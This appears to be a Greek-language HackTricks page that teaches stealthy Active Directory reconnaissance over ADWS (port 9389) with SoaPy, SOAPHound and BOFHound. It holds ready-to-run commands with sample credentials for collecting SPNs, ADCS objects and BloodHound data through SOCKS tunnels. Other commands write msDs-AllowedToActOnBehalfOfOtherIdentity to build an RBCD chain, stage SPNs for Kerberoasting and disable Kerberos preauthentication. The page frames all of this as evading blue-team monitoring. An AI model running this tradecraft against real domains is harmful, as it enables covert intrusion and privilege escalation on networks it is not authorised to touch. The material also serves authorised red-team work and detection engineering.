# Active Directory Web Services (ADWS) Ανίχνευση & Σιωπηρή Συλλογή

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Active Directory Web Services (ADWS) είναι **ενεργοποιημένο εξ ορισμού σε κάθε Domain Controller από το Windows Server 2008 R2** και ακούει στο TCP **9389**. Παρά το όνομα, **δεν εμπλέκεται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα τύπου LDAP μέσω μιας στοίβας ιδιόκτητων .NET framing πρωτοκόλλων:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση είναι ενθυλακωμένη μέσα σε αυτά τα binary SOAP frames και ταξιδεύει πάνω από μια ασυνήθιστη θύρα, **η απογραφή μέσω ADWS είναι πολύ λιγότερο πιθανό να ελεγχθεί, να φιλτραριστεί ή να ανιχνευθεί με signatures σε σχέση με την κλασική κίνηση LDAP/389 & 636**. Για τους operators αυτό σημαίνει:

* Πιο σιωπηρή αναγνωριστική δραστηριότητα – οι Blue teams συχνά επικεντρώνονται σε LDAP queries.
* Δυνατότητα συλλογής από **non-Windows hosts (Linux, macOS)** με tunnelling του 9389/TCP μέσω SOCKS proxy.
* Τα ίδια δεδομένα που θα λάβετε μέσω LDAP (users, groups, ACLs, schema, κ.λπ.) και η δυνατότητα εκτέλεσης **writes** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις ADWS υλοποιούνται πάνω από WS-Enumeration: κάθε query ξεκινά με ένα μήνυμα `Enumerate` που ορίζει το LDAP filter/attributes και επιστρέφει ένα `EnumerationContext` GUID, ακολουθούμενο από ένα ή περισσότερα μηνύματα `Pull` που ρέουν μέχρι το παράθυρο αποτελεσμάτων που ορίζει ο server. Τα contexts λήγουν μετά από ~30 λεπτά, οπότε τα εργαλεία είτε πρέπει να σελιδοποιούν τα αποτελέσματα είτε να χωρίζουν τα φίλτρα (prefix queries ανά CN) για να αποφύγουν την απώλεια κατάστασης. Όταν ζητάτε security descriptors, καθορίστε τον έλεγχο `LDAP_SERVER_SD_FLAGS_OID` για να αφαιρέσετε τα SACLs — διαφορετικά το ADWS απλά παραλείπει το attribute `nTSecurityDescriptor` από την SOAP απάντηση.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επαν-υλοποίηση της στοίβας πρωτοκόλλων ADWS σε καθαρό Python**. Κατασκευάζει τα πλαίσια NBFX/NBFSE/NNS/NMF byte-for-byte, επιτρέποντας τη συλλογή από Unix-like συστήματα χωρίς να απαιτείται το .NET runtime.

### Key Features

* Υποστηρίζει **proxying through SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερή φίλτρα αναζήτησης όμοια με το LDAP `-q '(objectClass=user)'`.
* Προαιρετικές **write** λειτουργίες (`--set` / `--delete`).
* **BOFHound output mode** για απευθείας εισαγωγή στο BloodHound.
* Το flag `--parse` για ομορφότερη μορφοποίηση timestamps / `userAccountControl` όταν απαιτείται ανθρώπινη αναγνωσιμότητα.

### Targeted collection flags & write operations

Το SoaPy περιλαμβάνει επιμελημένα switches που αναπαράγουν τις πιο κοινές LDAP αναζητήσεις πάνω από ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και ωμά `--query` / `--filter` για προσαρμοσμένα pulls. Συνδυάστε τα με write primitives όπως `--rbcd <source>` (ορίζει `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging για στοχευμένο Kerberoasting) και `--asrep` (αντιστροφή του `DONT_REQ_PREAUTH` στο `userAccountControl`).

Παράδειγμα στοχευμένης αναζήτησης SPN που επιστρέφει μόνο `samAccountName` και `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Χρησιμοποιήστε το ίδιο host/credentials για να οπλίσετε αμέσως τα ευρήματα: dump RBCD-capable objects με `--rbcds`, έπειτα εφαρμόστε `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να στήσετε μια Resource-Based Constrained Delegation chain (δείτε [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή κατάχρησης).

### Εγκατάσταση (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Συλλογή ADWS Υψηλού Όγκου (Windows)

Το [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας .NET συλλέκτης που διατηρεί όλες τις LDAP αλληλεπιδράσεις μέσα στο ADWS και εξάγει BloodHound v4-compatible JSON. Δημιουργεί μια πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` μία φορά (`--buildcache`), και στη συνέχεια την επαναχρησιμοποιεί για διελεύσεις υψηλού όγκου `--bhdump`, `--certdump` (ADCS), ή `--dnsdump` (AD-integrated DNS), έτσι ώστε μόνο ~35 κρίσιμα attributes να βγαίνουν από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) κατακερματίζει αυτόματα τα ερωτήματα με βάση το πρόθεμα CN για να παραμείνει κάτω από το 30-λεπτο EnumerationContext timeout σε μεγάλα forests.

Τυπική ροή εργασίας σε domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Τα εξαγόμενα JSON slots μπορούν να τροφοδοτηθούν απευθείας σε SharpHound/BloodHound workflows — δείτε τη [BloodHound methodology](bloodhound.md) για ιδέες σχετικά με downstream γραφήματα. Το AutoSplit καθιστά το SOAPHound ανθεκτικό σε δάση με πολλαπλά εκατομμύρια αντικείμενα, διατηρώντας τον αριθμό ερωτημάτων χαμηλότερο από snapshots τύπου ADExplorer.

## Αφανής ροή συλλογής AD

Η παρακάτω ροή δείχνει πώς να απαριθμήσετε **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να αναζητήσετε μονοπάτια επίθεσης βάσει πιστοποιητικών — όλα από Linux:

1. **Tunnel 9389/TCP** από το δίκτυο-στόχο προς το μηχάνημά σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward, κ.λπ.).  Εξάγετε `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε τα `--proxyHost/--proxyPort` του SoaPy.

2. **Συλλέξτε το root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλογή αντικειμένων σχετικά με το ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατρέψτε σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανεβάστε το ZIP** στο BloodHound GUI και τρέξτε ερωτήματα cypher όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε μονοπάτια κλιμάκωσης πιστοποιητικών (ESC1, ESC8, κ.λπ.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδυάστε αυτό με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη αλυσίδα **Resource-Based Constrained Delegation** (βλέπε [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Περίληψη Εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |

## Αναφορές

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
